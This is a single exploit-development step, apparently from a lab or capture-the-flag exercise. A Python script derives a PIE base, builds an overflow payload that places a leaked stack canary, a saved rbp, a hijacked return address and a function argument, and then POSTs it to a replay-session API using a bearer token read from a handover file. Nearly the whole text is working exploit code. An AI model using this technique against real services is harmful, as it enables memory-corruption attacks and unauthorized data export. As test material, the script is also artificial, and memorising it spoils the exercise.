## Step 1: Build and submit the exploit record

Derive PIE base from `status_address - status_offset`. Use `export_history` ELF symbol (found via objdump/readelf). Place `HIST-APR-CRR-09` string vaddr as the argument.

```python
import base64, hashlib, struct, ssl, urllib.request, pathlib, json

# From W31.1 record
STACK_CANARY = 0x91d4c6aa72be3f05
STATUS_ADDRESS = 0x555550001229
STATUS_OFFSET = 9513
VAULT_BASE = STATUS_ADDRESS - STATUS_OFFSET   # 0x555550000000

# From ELF analysis of worker binary (export_history symbol vaddr and HIST string vaddr):
EXPORT_HISTORY_VADDR = 0x555550000a90   # example; derive from worker ELF
HIST_STRING_VADDR    = 0x555550002000   # example; find "HIST-APR-CRR-09\0" in worker ELF

def crc32c(data):
    v = 0xFFFFFFFF
    for b in data:
        v ^= b
        for _ in range(8):
            v = (v >> 1) ^ (0x82F63B78 if v & 1 else 0)
    return v ^ 0xFFFFFFFF

payload = bytearray(b"A" * 500)
struct.pack_into("<Q", payload, 0x120, STACK_CANARY)        # canary at workspace_bytes
struct.pack_into("<Q", payload, 0x128, VAULT_BASE + 0x18000) # saved rbp
struct.pack_into("<Q", payload, 0x130, EXPORT_HISTORY_VADDR) # return address
struct.pack_into("<Q", payload, 0x138, HIST_STRING_VADDR)    # rdi argument

declared, header = 0xFE08, 0x01F8
record = b"DVL1" + struct.pack("<HHI", declared, header, crc32c(payload)) + payload

token = pathlib.Path("handover/corporate-session").read_text().strip()
context = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
body = json.dumps({
    "case_id": "DV-CRR-4417", "build_id": "DVL-WORKER-R5",
    "record_b64": base64.b64encode(record).decode()
}).encode()
req = urllib.request.Request(
    "https://process-view.arwc.test/api/replay-sessions/current/divergence",
    data=body,
    headers={"Authorization": "Bearer " + token, "X-ARWC-Tenant": "arwc",
             "Content-Type": "application/json"},
    method="POST")
resp = urllib.request.urlopen(req, context=context)
result = json.loads(resp.read())
print(json.dumps(result, indent=2))
```
